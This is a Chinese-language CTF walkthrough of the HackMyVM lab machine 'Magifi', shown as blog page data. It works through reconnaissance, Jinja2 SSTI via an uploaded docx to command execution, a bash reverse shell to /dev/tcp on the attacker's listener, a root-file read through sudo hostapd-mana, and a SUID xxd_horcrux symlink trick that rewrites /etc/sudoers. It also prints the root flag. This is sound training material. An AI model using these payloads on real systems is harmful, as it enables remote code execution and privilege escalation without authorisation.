{"pageProps":{"postData":{"id":"HackMyVMMagifi","contentHtml":"<h1>Magifi.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Magifi\">https://hackmyvm.eu/machines/machine.php?vm=Magifi</a></p>\n</blockquote>\n<p>Notes: <strong>MagiFi is a machine designed to test a variety of offensive security skills, including web, network, wifi and privilege escalation techniques, requiring knowledge of network analysis and authentication mechanisms offering a realistic and immersive experience within a controlled environment. Creators @x4v1l0k and @M4rdc0re.</strong></p>\n<p>第一台<code>Hard</code>靶机，看介绍存在<code>WIFI</code>利用也是第一次碰到</p>\n<h2>前期踩点</h2>\n<p><code>nmap</code>扫描，<code>26</code>是靶机</p>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~/Desktop/test/magifi]\n└─# nmap -sP 192.168.56.0/24                     \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-12 05:14 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00053s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00029s latency).\nMAC Address: 08:00:27:34:2E:28 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.26\nHost is up (0.00042s latency).\nMAC Address: 08:00:27:33:7C:E1 (Oracle VirtualBox virtual NIC)\n</code></pre>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~/Desktop/test/magifi]\n└─# nmap -sT -min-rate 10000 -p- 192.168.56.26\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-12 05:15 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.26\nHost is up (0.00047s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:33:7C:E1 (Oracle VirtualBox virtual NIC)\n</code></pre>\n<p>需要设置域名<code>hogwarts.htb</code> 记录</p>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~/Desktop/test/magifi]                                                                                                                      \n└─# nmap -sT -A -T4 -O -p 22,80 192.168.56.26                                                                                                                \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-12 05:16 EST                                                                                           \nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.26                                                                                                                           \nHost is up (0.00059s latency).                                                                                                                               \n                                                                                                                                                             \nPORT   STATE SERVICE VERSION                                                  \n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:                                                                \n|   3072 0c:c6:d6:24:1e:5b:9e:66:25:0a:ba:0a:08:0b:18:40 (RSA)                                                                                               \n|   256 9c:c3:1d:ea:22:04:93:b7:81:<span class=\"hljs-built_in\">dd</span>:f2:96:5d:f0:1f:9b (ECDSA)                                                                                              \n|_  256 55:41:15:90:ff:1d:53:88:e7:65:91:4f:fd:cf:49:85 (ED25519)                                                                                            \n80/tcp open  http    Werkzeug/3.0.4 Python/3.8.10                                                                                                            \n|_http-title: Did not follow redirect to http://hogwarts.htb                                                                                                 \n|_http-server-header: Werkzeug/3.0.4 Python/3.8.10                                                                                                           \n| fingerprint-strings:                                                                                                                                       \n|   GetRequest, HTTPOptions:                                                                                                                                 \n|     HTTP/1.1 302 FOUND                                                                                                                                     \n|     Server: Werkzeug/3.0.4 Python/3.8.10                                \n|     Date: Wed, 12 Feb 2025 10:16:22 GMT                                                                                                                    \n|     Content-Type: text/html; charset=utf-8                                  \n|     Content-Length: 225          \n|     Location: http://hogwarts.htb                                           \n|     Connection: close                                                                                                                                      \n|     &#x3C;!doctype html>                                                                                                                                        \n|     &#x3C;html lang=en>                                                                                                                                         \n|     &#x3C;title>Redirecting...&#x3C;/title>                                           \n|     &#x3C;h1>Redirecting...&#x3C;/h1>                                                                                                                                \n|     &#x3C;p>You should be redirected automatically to the target URL: &#x3C;a href=<span class=\"hljs-string\">\"http://hogwarts.htb\"</span>>http://hogwarts.htb&#x3C;/a>. If not, click the <span class=\"hljs-built_in\">link</span>.            \n|   RTSPRequest:                                                                                                                                             \n|     &#x3C;!DOCTYPE HTML PUBLIC <span class=\"hljs-string\">\"-//W3C//DTD HTML 4.01//EN\"</span>                                                                                                      \n|     <span class=\"hljs-string\">\"http://www.w3.org/TR/html4/strict.dtd\"</span>>                                                                                                               \n|     &#x3C;html>                                                                                                                                                 \n|     &#x3C;<span class=\"hljs-built_in\">head</span>>                                                                                                                                                 \n|     &#x3C;meta http-equiv=<span class=\"hljs-string\">\"Content-Type\"</span> content=<span class=\"hljs-string\">\"text/html;charset=utf-8\"</span>>                                                                                     \n|     &#x3C;title>Error response&#x3C;/title>                                                                                                                          \n|     &#x3C;/head>                                                                                                                                                \n|     &#x3C;body>                                                                  \n|     &#x3C;h1>Error response&#x3C;/h1>                                                                                                                                \n|     &#x3C;p>Error code: 400&#x3C;/p>                                                  \n|     &#x3C;p>Message: Bad request version (<span class=\"hljs-string\">'RTSP/1.0'</span>).&#x3C;/p>                                                                                                      \n|     &#x3C;p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&#x3C;/p>                                                      \n|     &#x3C;/body>                                                                                                                                                \n|_    &#x3C;/html>          \nMAC Address: 08:00:27:33:7C:E1 (Oracle VirtualBox virtual NIC)                                                                                               \nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                        \nDevice <span class=\"hljs-built_in\">type</span>: general purpose                                                                                                                                 \nRunning: Linux 4.X|5.X                                                                                                                                       \nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5           \nOS details: Linux 4.15 - 5.8                                                                                                                                 \nNetwork Distance: 1 hop                                                       \nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   \n                                                                              \nTRACEROUTE                                                                                                                                                   \nHOP RTT     ADDRESS                                                                                                                                          \n1   0.59 ms 192.168.56.26                                           \n</code></pre>\n<p>再扫描一下网站目录，扫描出来<code>upload</code>文件夹，那么表示可能存在上传功能</p>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~/Desktop/test]\n└─# dirsearch -u http://hogwarts.htb -x 403 -e php,zip,txt\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, zip, txt | HTTP method: GET | Threads: 25\nWordlist size: 10439\n\nOutput File: /root/Desktop/test/reports/http_hogwarts.htb/_25-02-12_05-22-08.txt\n\nTarget: http://hogwarts.htb/\n\n[05:22:08] Starting: \n[05:23:02] 405 -  153B  - /upload\n</code></pre>\n<p>访问页面，并采集指纹，采用<code>flask</code>搭建，那么可能存在<code>SSTI</code> （需要注意）, 内容大概是和哈利波特有关</p>\n<p><img src=\"/post-images/HackMyVMMagifi/image83.png\" alt=\"image.png\"></p>\n<p>优先级<code>80</code> > <code>22</code></p>\n<h2>上传功能点测试</h2>\n<p>在页面最底下果然发现了上传文件功能，并且告诉我们使用他们的模板<code>template</code> ，是个超链接</p>\n<p><img src=\"/post-images/HackMyVMMagifi/image84.png\" alt=\"image.png\"></p>\n<p>点击后是下载了一个<code>docx</code>文件，内容是，我们先按照它的格式填写好并上传</p>\n<pre><code class=\"hljs language-bash\">Application Letter to Hogwarts School of Witchcraft and Wizardry\nDear Headmaster or Headmistress,\n\nI am writing to express my strong interest <span class=\"hljs-keyword\">in</span> applying <span class=\"hljs-keyword\">for</span> admission to Hogwarts School of Witchcraft and Wizardry. From a very young age, I have been fascinated by the magical world, and I believe that Hogwarts is the ideal place <span class=\"hljs-keyword\">for</span> me to develop my skills and knowledge <span class=\"hljs-keyword\">in</span> magic. I am eager to learn and grow under the guidance of the esteemed professors at your prestigious institution.\n\nThroughout my life, I have demonstrated qualities such as curiosity, perseverance, and a deep desire to learn. I am particularly interested <span class=\"hljs-keyword\">in</span> subjects such as Charms, Potions, and Defense Against the Dark Arts, and I am confident that Hogwarts will provide me with the perfect environment to explore these interests.\n\nI am excited about the opportunity to become a part of the rich tradition and community at Hogwarts, and I hope that my application will be considered <span class=\"hljs-keyword\">for</span> the upcoming academic year. I have enclosed all required documents and would be grateful <span class=\"hljs-keyword\">for</span> your consideration.\n\nThank you <span class=\"hljs-keyword\">for</span> your <span class=\"hljs-keyword\">time</span> and consideration. I look forward to the possibility of joining Hogwarts and contributing to its legacy of excellence.\n\nYours sincerely,\n\nName: [Your Name]\nSurname: [Your Surname]\nAddress: [Your Address]\nBirthday: [Your Birthday]\nPet breed: [Your Pets Breed]\nPet’s Name: [Your Pets Name]\n\n</code></pre>\n<p>上传之后回显我们输入的内容</p>\n<p><img src=\"/post-images/HackMyVMMagifi/image85.png\" alt=\"image.png\"></p>\n<h2>SSTI 漏洞利用</h2>\n<p>测试一下是否存在<code>SSTI</code> ，我们将<code>name</code>设置为 <code>Name: {{ 7*7 }}</code> ，然后提交上传</p>\n<p>欸嘿，果然存在<code>SSTI</code></p>\n<p><img src=\"/post-images/HackMyVMMagifi/image86.png\" alt=\"image.png\"></p>\n<p>开始构造<code>SSTI</code> ：</p>\n<pre><code class=\"hljs language-bash\">Name: {{self.__init__.__globals__.__builtins__}} ，且存在<span class=\"hljs-built_in\">eval</span> 和__import__\n</code></pre>\n<p><img src=\"/post-images/HackMyVMMagifi/image87.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">Name: {{self.__init__.__globals__.__builtins__.__import__(<span class=\"hljs-string\">'os'</span>).popen(<span class=\"hljs-string\">'id'</span>).<span class=\"hljs-built_in\">read</span>()}}\n</code></pre>\n<p><img src=\"/post-images/HackMyVMMagifi/image88.png\" alt=\"image.png\"></p>\n<p>我直接读取<code>UserFlag</code></p>\n<pre><code class=\"hljs language-bash\">Name:{{self.__init__.__globals__.__builtins__.__import__(<span class=\"hljs-string\">'os'</span>).popen(<span class=\"hljs-string\">'cat /home/ harry_potter/user.txt'</span>).<span class=\"hljs-built_in\">read</span>()}}\n</code></pre>\n<p>注意空格,在有空格地方不能换行，在没空格的地方用空格顶到换行，否则空格会被换行符替换掉，然后上传上去的时候去掉换行符你的<code>payload</code>会变成 <code>cat/home…</code> 了</p>\n<p><img src=\"/post-images/HackMyVMMagifi/image89.png\" alt=\"image.png\"></p>\n<p>反弹<code>shell</code> ，<code>kali</code>开启监听</p>\n<pre><code class=\"hljs language-bash\">Name: {{self.__init__.__globals__.__builtins__.__import__(<span class=\"hljs-string\">'os'</span>).popen(<span class=\"hljs-string\">'/bin/bash -c \"bash -  i >&#x26; /dev/tcp/192.168.56.4/4444 0>&#x26;1\"'</span>).<span class=\"hljs-built_in\">read</span>()}}\n</code></pre>\n<p>成功获得<code>shell</code></p>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~/Desktop/test/magifi]\n└─# nc -lvp 4444                           \nlistening on [any] 4444 ...\nconnect to [192.168.56.4] from hogwarts.htb [192.168.56.26] 39508\nbash: cannot <span class=\"hljs-built_in\">set</span> terminal process group (766): Inappropriate ioctl <span class=\"hljs-keyword\">for</span> device\nbash: no job control <span class=\"hljs-keyword\">in</span> this shell\nharry_potter@MagiFi:~/Hogwarts_web$ \n</code></pre>\n<h2>靶机信息收集</h2>\n<p>存在很多的无线网卡，并且能看到还有<code>Docker</code>的网卡</p>\n<pre><code class=\"hljs language-bash\">harry_potter@MagiFi:~$ ip add                                                 \n1: lo: &#x3C;LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    <span class=\"hljs-built_in\">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00                                                                                                    \n    inet 127.0.0.1/8 scope host lo                                            \n       valid_lft forever preferred_lft forever                                                                                                               \n    inet6 ::1/128 scope host                                                  \n       valid_lft forever preferred_lft forever\n2: enp0s3: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000\n    <span class=\"hljs-built_in\">link</span>/ether 08:00:27:33:7c:e1 brd ff:ff:ff:ff:ff:ff\n    inet 192.168.56.26/24 brd 192.168.56.255 scope global dynamic enp0s3\n       valid_lft 529sec preferred_lft 529sec                                                                                                                 \n    inet6 fe80::a00:27ff:fe33:7ce1/64 scope <span class=\"hljs-built_in\">link</span>                     \n       valid_lft forever preferred_lft forever\n14: docker0: &#x3C;NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default \n    <span class=\"hljs-built_in\">link</span>/ether 02:42:10:80:36:d9 brd ff:ff:ff:ff:ff:ff\n    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0\n       valid_lft forever preferred_lft forever\n15: wlan0: &#x3C;BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                      \n    <span class=\"hljs-built_in\">link</span>/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff                        \n16: wlan1: &#x3C;BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                      \n    <span class=\"hljs-built_in\">link</span>/ether 02:00:00:00:01:00 brd ff:ff:ff:ff:ff:ff                        \n17: wlan2: &#x3C;BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                      \n    <span class=\"hljs-built_in\">link</span>/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff                        \n18: wlan3: &#x3C;BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                      \n    <span class=\"hljs-built_in\">link</span>/ether 02:00:00:00:03:00 brd ff:ff:ff:ff:ff:ff\n19: wlan4: &#x3C;BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                      \n    <span class=\"hljs-built_in\">link</span>/ether 02:00:00:00:04:00 brd ff:ff:ff:ff:ff:ff                        \n20: wlan5: &#x3C;BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                      \n    <span class=\"hljs-built_in\">link</span>/ether 02:00:00:00:05:00 brd ff:ff:ff:ff:ff:ff                        \n21: wlan6: &#x3C;BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                      \n    <span class=\"hljs-built_in\">link</span>/ether 02:00:00:00:06:00 brd ff:ff:ff:ff:ff:ff                        \n75: wlan60: &#x3C;BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                     \n    <span class=\"hljs-built_in\">link</span>/ether 02:00:00:00:3c:00 brd ff:ff:ff:ff:ff:ff                                                                                                       \n76: hwsim0: &#x3C;BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                     \n    <span class=\"hljs-built_in\">link</span>/ieee802.11/radiotap 12:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff          \n78: veth1@if77: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000                                                    \n    <span class=\"hljs-built_in\">link</span>/ether f6:e7:d7:e4:13:c6 brd ff:ff:ff:ff:ff:ff link-netnsid 0         \n    inet 10.200.1.1/24 scope global veth1     \n       valid_lft forever preferred_lft forever                                                                                                               \n    inet6 fe80::f4e7:d7ff:fee4:13c6/64 scope <span class=\"hljs-built_in\">link</span>     \n       valid_lft forever preferred_lft forever                          \n80: veth2@if79: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000                                                    \n    <span class=\"hljs-built_in\">link</span>/ether 2a:c1:47:8c:c6:64 brd ff:ff:ff:ff:ff:ff link-netnsid 1\n    inet 10.200.2.1/24 scope global veth2     \n       valid_lft forever preferred_lft forever                                                                                                               \n    inet6 fe80::28c1:47ff:fe8c:c664/64 scope <span class=\"hljs-built_in\">link</span>     \n       valid_lft forever preferred_lft forever         \n</code></pre>\n<p>查看权限，可以使用<code>root</code>权限运行很多网络工具</p>\n<pre><code class=\"hljs language-bash\">harry_potter@MagiFi:~$ <span class=\"hljs-built_in\">sudo</span> -l\n<span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> harry_potter on MagiFi:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser harry_potter may run the following commands on MagiFi:\n    (root) NOPASSWD: /usr/sbin/aireplay-ng, /usr/sbin/airmon-ng,\n        /usr/sbin/airodump-ng, /usr/bin/airdecap-ng, /usr/bin/hostapd-mana\n</code></pre>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">sudo</span> /usr/sbin/aireplay-ng --<span class=\"hljs-built_in\">help</span>\n<span class=\"hljs-built_in\">sudo</span> /usr/sbin/airmon-ng -h\n<span class=\"hljs-built_in\">sudo</span> /usr/sbin/airodump-ng --<span class=\"hljs-built_in\">help</span>\n<span class=\"hljs-built_in\">sudo</span> /usr/bin/airdecap-ng --<span class=\"hljs-built_in\">help</span>\n<span class=\"hljs-built_in\">sudo</span> /usr/bin/hostapd-mana -h\n</code></pre>\n<h2>解法 1</h2>\n<blockquote>\n<p>根据群友们提示</p>\n</blockquote>\n<p>首先查看<code>hostapd-mana</code>的帮助</p>\n<pre><code class=\"hljs language-bash\">harry_potter@MagiFi:~/Hogwarts_web$ <span class=\"hljs-built_in\">sudo</span> /usr/bin/hostapd-mana -h\nhostapd-mana v2.6\nUser space daemon <span class=\"hljs-keyword\">for</span> IEEE 802.11 AP management,\nIEEE 802.1X/WPA/WPA2/EAP/RADIUS Authenticator\nCopyright (c) 2002-2016, Jouni Malinen &#x3C;j@w1.fi> and contributors\n--------------------------------------------------\nMANA https://github.com/sensepost/hostapd-mana\nBy @singe (dominic@sensepost.com)\nOriginal MANA EAP by Ian (ian@sensepost.com)\nOriginal karma patches by Robin Wood - robin@digininja.org\nOriginal EAP patches by Brad Antoniewicz @brad_anton\nSycophant by Michael Kruger @_cablethief\nusage: hostapd [-hdBKtv] [-P &#x3C;PID file>] [-e &#x3C;entropy file>] \\\n         [-g &#x3C;global ctrl_iface>] [-G &#x3C;group>]\\\n         [-i &#x3C;comma-separated list of interface names>]\\\n         &#x3C;configuration file(s)>\n\noptions:\n   -h   show this usage\n   -d   show more debug messages (-<span class=\"hljs-built_in\">dd</span> <span class=\"hljs-keyword\">for</span> even more)\n   -B   run daemon <span class=\"hljs-keyword\">in</span> the background\n   -e   entropy file\n   -g   global control interface path\n   -G   group <span class=\"hljs-keyword\">for</span> control interfaces\n   -P   PID file\n   -K   include key data <span class=\"hljs-keyword\">in</span> debug messages\n   -i   list of interface names to use\n   -S   start all the interfaces synchronously\n   -t   include timestamps <span class=\"hljs-keyword\">in</span> some debug messages\n   -v   show hostapd version\nharry_potter@MagiFi:~/Hogwarts_web$ \n</code></pre>\n<p>可以注意到<code>-d   show more debug messages (-dd for even more)</code> 输出更多调试信息，然后最后是跟上<code>&#x3C;configuration file(s)></code> 数据文件</p>\n<p>然后我们在他后面跟上<code>/root/root.txt</code>即可读出<code>flag</code></p>\n<pre><code class=\"hljs language-bash\">harry_potter@MagiFi:~/Hogwarts_web$ <span class=\"hljs-built_in\">sudo</span> /usr/bin/hostapd-mana -<span class=\"hljs-built_in\">dd</span> /root/root.txt\n&#x3C;_web$ <span class=\"hljs-built_in\">sudo</span> /usr/bin/hostapd-mana -<span class=\"hljs-built_in\">dd</span> /root/root.txt\nrandom: Trying to <span class=\"hljs-built_in\">read</span> entropy from /dev/random\nConfiguration file: /root/root.txt\nLine 1: invalid line <span class=\"hljs-string\">'hogwarts{5ed0818c0181fe97f744d7b1b51dd9c7}'</span>\n1 errors found <span class=\"hljs-keyword\">in</span> configuration file <span class=\"hljs-string\">'/root/root.txt'</span>\nFailed to <span class=\"hljs-built_in\">set</span> up interface with /root/root.txt\nhostapd_init: free iface 0x55809fa7af40\nFailed to initialize interface\n</code></pre>\n<h2>解法 2</h2>\n<p>查找系统中所有具有 <code>SUID（Set User ID）</code>权限的可执行文件</p>\n<p>找到一些奇奇怪怪的，<code>/usr/bin/xxd_horcrux</code> 和<code>/home/tom.riddle/.horcrux.png</code></p>\n<pre><code class=\"hljs language-bash\">harry_potter@MagiFi:~$ find / -perm -u=s -<span class=\"hljs-built_in\">type</span> f 2>/dev/null\n/usr/bin/gpasswd                                                              \n/usr/bin/chfn                 \n/usr/bin/umount               \n/usr/bin/newgrp                  \n/usr/bin/xxd_horcrux  \n/usr/lib/eject/dmcrypt-get-device\n...\n/home/tom.riddle/.horcrux.png\n</code></pre>\n<p>查看<code>/usr/bin/xxd_horcrux</code> 权限</p>\n<pre><code class=\"hljs language-bash\">harry_potter@MagiFi:~$ <span class=\"hljs-built_in\">ls</span> -al /usr/bin/xxd_horcrux\n-rwsr-xr-x 1 root root 17264 Sep 25 12:22 /usr/bin/xxd_horcrux\n</code></pre>\n<p>尝试将<code>/etc/shadow</code>文件使用<code>xxd</code>读出来，貌似读不出来，这是莫改过的<code>xxd</code></p>\n<pre><code class=\"hljs language-bash\">harry_potter@MagiFi:~$ /usr/bin/xxd_horcrux -i /etc/shadow -O pass\nNot every wizards can use or destroy a Horcrux!\n</code></pre>\n<pre><code class=\"hljs language-bash\">harry_potter@MagiFi:~$ find / -name *horcrux* 2>/dev/null\n/usr/bin/xxd_horcrux\n/home/tom.riddle/.horcrux.png\n</code></pre>\n<p>又尝试<code>/home/tom.riddle/.horcrux.png</code> 但是提示<code>permission denied</code> ，摸不着头脑</p>\n<p>根据<code>xxd_horcrux</code>的提示，可能后面是要跟<code>.horcrux.png</code> ，不过还是提示了错误</p>\n<pre><code class=\"hljs language-bash\">harry_potter@MagiFi:~$ /usr/bin/xxd_horcrux -i /home/tom.riddle/.horcrux.png -O 1.txt\nNot every wizards can use or destroy a Horcrux!\n</code></pre>\n<p>我们将<code>xxd_horcrux</code> 拉取出来，使用<code>IDA</code>分析</p>\n<pre><code class=\"hljs language-bash\">int __fastcall main(int argc, const char **argv, const char **envp)\n{\n  char **argva; // [rsp+0h] [rbp-30h]\n  int v5; // [rsp+Ch] [rbp-24h]\n  int i; // [rsp+18h] [rbp-18h]\n  int fd; // [rsp+1Ch] [rbp-14h]\n  char *s1; // [rsp+20h] [rbp-10h]\n\n  v5 = argc;\n  argva = (char **)argv;\n  s1 = 0LL;\n  <span class=\"hljs-keyword\">if</span> ( argc &#x3C;= 1\n    || (argv = (const char **)<span class=\"hljs-string\">\"-h\"</span>, *(_QWORD *)&#x26;argc = argva[1], !strcmp(*(const char **)&#x26;argc, <span class=\"hljs-string\">\"-h\"</span>))\n    || (argv = (const char **)<span class=\"hljs-string\">\"--help\"</span>, *(_QWORD *)&#x26;argc = argva[1], !strcmp(*(const char **)&#x26;argc, <span class=\"hljs-string\">\"--help\"</span>)) )\n  {\n    show_help(*(_QWORD *)&#x26;argc, argv, envp);\n    <span class=\"hljs-built_in\">return</span> 1;\n  }\n  <span class=\"hljs-keyword\">else</span>\n  {\n    <span class=\"hljs-keyword\">for</span> ( i = 1; i &#x3C; v5; ++i )\n    {\n      <span class=\"hljs-keyword\">if</span> ( !strcmp(argva[i], <span class=\"hljs-string\">\"-O\"</span>) &#x26;&#x26; v5 > i + 1 )\n      {\n        s1 = argva[i + 1];\n        argva[i] = 0LL;\n        argva[i + 1] = 0LL;\n        <span class=\"hljs-built_in\">break</span>;\n      }\n    }\n    <span class=\"hljs-keyword\">if</span> ( s1 )\n    {\n      <span class=\"hljs-keyword\">if</span> ( !strcmp(s1, <span class=\"hljs-string\">\".horcrux.png\"</span>) )\n      {\n        fd = open(s1, 577, 384LL);\n        <span class=\"hljs-keyword\">if</span> ( fd >= 0 )\n        {\n          <span class=\"hljs-keyword\">if</span> ( dup2(fd, 1) >= 0 )\n          {\n            close(fd);\n            execvp(<span class=\"hljs-string\">\"/usr/bin/xxd\"</span>, argva);\n            perror(<span class=\"hljs-string\">\"Error executing xxd\"</span>);\n          }\n          <span class=\"hljs-keyword\">else</span>\n          {\n            perror(<span class=\"hljs-string\">\"Error redirecting output to file\"</span>);\n            close(fd);\n          }\n          <span class=\"hljs-built_in\">return</span> 1;\n        }\n        <span class=\"hljs-keyword\">else</span>\n        {\n          perror(<span class=\"hljs-string\">\"Error opening output file\"</span>);\n          <span class=\"hljs-built_in\">return</span> 1;\n        }\n      }\n      <span class=\"hljs-keyword\">else</span>\n      {\n        fwrite(<span class=\"hljs-string\">\"Not every wizards can use or destroy a Horcrux!\\n\"</span>, 1uLL, 0x30uLL, stderr);\n        <span class=\"hljs-built_in\">return</span> 1;\n      }\n    }\n</code></pre>\n<p>可以看到判断了是否存在<code>-O</code>参数，然后<code>-O</code>参数后面跟着的必须是<code>.horcrux.png</code> ，但是<code>.horcrux.png</code> 没有指定一定要是在<code>/home/tom.riddle</code> 家目录里面，所以我们可以在我们家目录创建<code>.horcrux.png</code> ，然后通过<code>xxd_horcurx</code>读取文件内容输出到<code>.horcrux.png</code></p>\n<pre><code class=\"hljs language-bash\">harry_potter@MagiFi:~$ <span class=\"hljs-built_in\">touch</span> <span class=\"hljs-string\">\" \"</span> > .horcrux.png\nharry_potter@MagiFi:~$ /usr/bin/xxd_horcrux /root/root.txt -O .horcrux.png \nharry_potter@MagiFi:~$ <span class=\"hljs-built_in\">cat</span> .horcrux.png \n00000000: 686f 6777 6172 7473 7b35 6564 3038 3138  hogwarts{5ed0818\n00000010: 6330 3138 3166 6539 3766 3734 3464 3762  c0181fe97f744d7b\n00000020: 3162 3531 6464 3963 377d 0a              1b51dd9c7}.\nharry_potter@MagiFi:~$ \n</code></pre>\n<p>成功读到<code>Rootflag</code>文件</p>\n<pre><code class=\"hljs language-bash\">hogwarts{5ed0818c0181fe97f744d7b1b51dd9c7}.\n</code></pre>\n<p>顺便将<code>RootShell</code>也拿了，通过<a href=\"https://gtfobins.github.io/gtfobins/xxd/#file-write\">https://gtfobins.github.io/gtfobins/xxd/#file-write</a> 可以知道可以利用<code>xxd</code>修改文件，我们将<code>/etc/passwd</code>或者<code>/etc/sudoer</code>修改即可</p>\n<pre><code class=\"hljs language-bash\">harry_potter@MagiFi:~$ /usr/bin/xxd_horcrux /etc/sudoers -O .horcrux.png \nharry_potter@MagiFi:~$ <span class=\"hljs-built_in\">cat</span> .horcrux.png | xxd -r > tmp\nharry_potter@MagiFi:~$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"harry_potter    ALL=(ALL:ALL) NOPASSWD: ALL\"</span> >> tmp\nharry_potter@MagiFi:~$ <span class=\"hljs-built_in\">rm</span> .horcrux.png\nharry_potter@MagiFi:~$ <span class=\"hljs-built_in\">ln</span> -sv /etc/sudoers .horcrux.png\n<span class=\"hljs-string\">'.horcrux.png'</span> -> <span class=\"hljs-string\">'/etc/sudoers'</span>\nharry_potter@MagiFi:~$ xxd tmp > getroot\nharry_potter@MagiFi:~$ /usr/bin/xxd_horcrux -r getroot -O .horcrux.png \n</code></pre>\n<p>再看一下我们的权限</p>\n<pre><code class=\"hljs language-bash\">harry_potter@MagiFi:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> harry_potter on MagiFi:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser harry_potter may run the following commands on MagiFi:\n    (root) NOPASSWD: /usr/sbin/aireplay-ng, /usr/sbin/airmon-ng, /usr/sbin/airodump-ng, /usr/bin/airdecap-ng, /usr/bin/hostapd-mana\n    (ALL : ALL) NOPASSWD: ALL\n</code></pre>\n<pre><code class=\"hljs language-bash\">harry_potter@MagiFi:~$ <span class=\"hljs-built_in\">sudo</span> su -\nroot@MagiFi:~# <span class=\"hljs-built_in\">id</span>\nuid=0(root) gid=0(root) <span class=\"hljs-built_in\">groups</span>=0(root)\nroot@MagiFi:~# \n</code></pre>","title":"HackMyVM - Magifi","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机","description":"Magifi.\n\n https://hackmyvm.eu/machines/machine.php?vm=Magifi\n \n\nNotes: MagiFi is a machine designed to test a variety of offensive security skills, including web, network, wifi and privilege escalatio..."},"recentPosts":[{"id":"HackTheBoxSeason8 - Cobblestone","title":"HackTheBox - Season8 - Cobblestone","date":"2025-08-11","isEncrypted":true,"year":"2025","month":"08","day":"11"},{"id":"TheHackersLabsShadowGate","title":"TheHackersLabs - ShadowGate","date":"2025-08-06","isEncrypted":false,"year":"2025","month":"08","day":"06"},{"id":"HackTheBoxSeason7-Code","title":"HackTheBox - Machine - Code","date":"2025-04-04","isEncrypted":false,"year":"2025","month":"08","day":"06"},{"id":"TheHackersLabsOfusPingu","title":"TheHackersLabs - OfusPingu","date":"2025-08-05","isEncrypted":false,"year":"2025","month":"08","day":"05"},{"id":"TheHackersLabsDoraemon","title":"TheHackersLabs - Doraemon","date":"2025-08-03","isEncrypted":false,"year":"2025","month":"08","day":"03"},{"id":"HackTheBoxSeason8 - Editor","title":"HackTheBox - Season8 - Editor","date":"2025-08-03","isEncrypted":true,"year":"2025","month":"08","day":"03"},{"id":"TheHackersLabsHellRoot","title":"TheHackersLabs - HellRoot","date":"2025-08-02","isEncrypted":false,"year":"2025","month":"08","day":"02"}]},"__N_SSG":true}